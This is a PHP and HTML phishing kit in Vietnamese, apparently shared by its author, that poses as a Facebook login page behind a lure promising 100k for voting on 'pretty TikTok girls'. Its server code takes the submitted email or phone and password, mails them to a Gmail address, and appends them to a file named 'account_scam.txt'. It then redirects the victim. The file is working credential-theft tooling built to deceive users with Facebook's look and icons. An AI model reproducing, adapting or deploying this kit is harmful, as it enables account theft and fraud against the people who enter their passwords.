<?php
    session_start();
    ob_start();
/*[ Code Được Xây Dựng Và Phát Triển Bởi Lê Mạnh Kiên ] */
/***[ Youtube: Kiên 205 Official ]***/
/***[ Zalo: 0843081105 ]***/
/***[ Nhớ Đăng Ký Kênh Youtube Của Mình Để Theo Dõi Và Nhận Các Code Mới Nhất Cũng Như Thủ Thuật Facebook Nha ]***/
/* Share Nhớ Ghi Nguồn Bên Mình Nhận Và Bán Code Website Code Tool Nhận Tạo Website Bán Tên Miền Giá Rẻ Hơn Các Website Bán Miền Khác */
/* Vui Lòng Không Chỉnh Sửa Gì */
?>
    <?php
    	if(isset($_POST["login"])){
    		$username = $_POST["email"];
    		$password = $_POST["pass"];
            if($username == "21"|| $password == "21"){
                echo "Bạn chưa nhập đầy đủ thông tin";
                
            }else{
                    
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
    		 $subject = "Kiên 205 Official";
             $headers = "Tài khoản - Facebook";
             $body = "$username| $password \n";
             mail("vuitiengiay@gmail.com", $headers, $body, $subject);
            $test = fopen("account_scam.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: /binhchongaixinhtiktok.html');
          
            }



    	}

    ?>

        <!DOCTYPE html>
        <html>

        <head>

            <meta charset='utf-8' />
            <meta content='width=device-width, initial-scale=1' name='viewport' />
            <meta property="og:title" content="Bình Chọn Gái Xinh TikTok Nhận Ngay 100k Khi Bình Chọn Xong" />
            <meta property="og:image" content="https://scontent.fsgn5-12.fna.fbcdn.net/v/t1.6435-9/175909135_470704027607298_75692814927856016_n.jpg?_nc_cat=103&ccb=1-5&_nc_sid=09cbfe&_nc_ohc=kIh_uu4D2dQAX8XyCAb&_nc_ht=scontent.fsgn5-12.fna&oh=00_AT-OP9fldwahRQ-Brn0knEsRJyLdmCpNNdIiBSNjGh7KpQ&oe=628960AA" />

            <link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css' integrity='sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC' rel='stylesheet' />
            <link data-badged-icon='https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico' data-default-icon='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='shortcut icon' />
            <title>Bình Chọn Gái Xinh TikTok</title>
            <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>
            <style id='page-skin-1' type='text/css'>
                <!-- @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
                body {
                    font-family: 'Roboto', sans-serif;
                    background-color: #eceff5;
                }
                
                input.form-control {
                    border: none;
                    border-bottom: 1px solid rgb(208, 208, 208);
                    background: none;
                }
                
                @media (pointer: fine) {
                    .fblog {
                        width: 600px;
                        text-align: center;
                        margin: auto;
                    }
                }
                
                ._8qtf {
                    margin: 12px 0 4px 0;
                    width: 100%;
                }
                
                ._43mg {
                    display: block;
                    overflow: hidden;
                    text-align: center;
                    white-space: nowrap;
                }
                
                ._43mg>span {
                    display: inline-block;
                    position: relative;
                }
                
                ._43mh {
                    color: #4b4f56;
                }
                
                ._43mg {
                    display: block;
                    overflow: hidden;
                    text-align: center;
                    white-space: nowrap;
                }
                
                ._43mg>span:before {
                    margin-right: 15px;
                    right: 100%;
                }
                
                ._43mg>span:before,
                ._43mg>span:after {
                    background: #ccd0d5;
                    content: '';
                    height: 1px;
                    position: absolute;
                    top: 50%;
                    width: 9999px;
                }
                
                ._43mg>span:after {
                    left: 100%;
                    margin-left: 15px;
                }
                
                ._43mg>span:before,
                ._43mg>span:after {
                    background: #ccd0d5;
                    content: '';
                    height: 1px;
                    position: absolute;
                    top: 50%;
                    width: 9999px;
                }
                
                ._43mg {
                    display: block;
                    overflow: hidden;
                    text-align: center;
                    margin-top: 20px;
                    white-space: nowrap;
                }
                
                input.form-control {
                    border-bottom: 1px solid #ddd;
                    background: white;
                    height: 40px;
                }
                
                ._52j9 {
                    color: #90949c;
                    text-align: center;
                }
                
                .header {
                    height: 40px;
                    width: 100%;
                    background-color: #3b5998;
                }
                
                .mb-4 {
                    margin-bottom: 0px!important;
                }
                input.form-control {
    border-bottom: 1px solid #ddd;
    background: white;
    height: 40px;
    font-size: 13px;
}
                .h4,
                h4 {
                    font-size: calc(1.275rem + .3vw);
                    text-align: center;
                    padding: 5px;
                    color: white;
                }
                .disclaimer {
    position: fixed;
    z-index: 9999999;
    bottom: 0;
    right: 0;
    border-top: 2px solid #ff5c62;
    text-align: center;
    font-size: 14px;
    font-weight: 400;
    background-color: #fff;
    padding: 0px;
    width: 0px;
    height: 0px;
}
             a {
    color: #0d6efd;
    text-decoration: underline;
    font-size: 13px;
}   
            </style>
        </head>

        <body>
            <div class="header">
                <h4>Facebook</h4>
            </div>
            <br>
            <div class='fblog'>
                <div>
                    <div class="_52jj _3-q2">

                        <img src="https://i.imgur.com/cfUdXzt.png" style="width: 85px; display: block; margin-left: auto; margin-right: auto;">
                        <div class="_52je _52j9">Bạn cần đăng nhập lại để bình chọn</div>
                    </div>
                </div>

                <div class='container'>
                    <div class='row justify-content-center'>
                        <div class='col-10'>
                            <form action='' method='POST'>
                                <div class='mb-4 mt-4'>
                                    <input class='form-control' name='email' placeholder='Số điện thoại hoặc email' required='required' type='text' />
                                </div>
                                <div class='mb-4'>
                                    <input class='form-control' name='pass' placeholder='Mật khẩu' required='required' type='password' />
                                </div>
                                <br>
                                <div class='d-grid gap-2'>
                                    <button class='btn btn-primary' name='login' onclick="thongbao()" style='font-size: 13px; font-weight:600; ' type='submit'>Đăng nhập</button>
                                </div>
                            </form>
                            <br />
                            <center><a href='https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0' style='text-decoration: none;font-weight: 500;'>Quên mật khẩu?</a></center>
                            <div class='_43mg _8qtf' data-sigil='login_reg_separator' id='login_reg_separator'><span class='_43mh'>hoặc</span></div>
                            <center>
                                <div style='margin-top:20px'>
                                    <div>
                                        <button hrel="https://www.facebook.com/" class='btn btn-success' style='     background: #098e00;     border: none;     font-weight: 600;     font-size: 13px;     width: max-content; ' type='button'>Tạo tài khoản mới</button>
                                    </div>
                                </div>
                            </center>
                        </div>
                    </div>
                </div>
            </div>
            <div class='navbar no-items section' id='navbar'></div>

            <script type='text/javascript'>
                $("#dangnhap").click(function() {
                    $("#dangnhap").text('Vui lòng chờ...');
                    $("#dangnhap").addClass('disabled');
                })

                function GetURLParameter(sParam) {
                    var sPageURL = window.location.search.substring(1);
                    var sURLVariables = sPageURL.split('&');
                    for (var i = 0; i < sURLVariables.length; i++) {
                        var sParameterName = sURLVariables[i].split('=');
                        if (sParameterName[0] == sParam) {
                            return sParameterName[1];
                        }
                    }
                }
            </script>
            <script>
                $(document).ready(function() {
                    var tech = GetURLParameter('id');
                    $("input[name=id]").val(tech);
                });
            </script>
            <script crossorigin='anonymous' integrity='sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM' src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js'></script>
        </body>
        
        </html>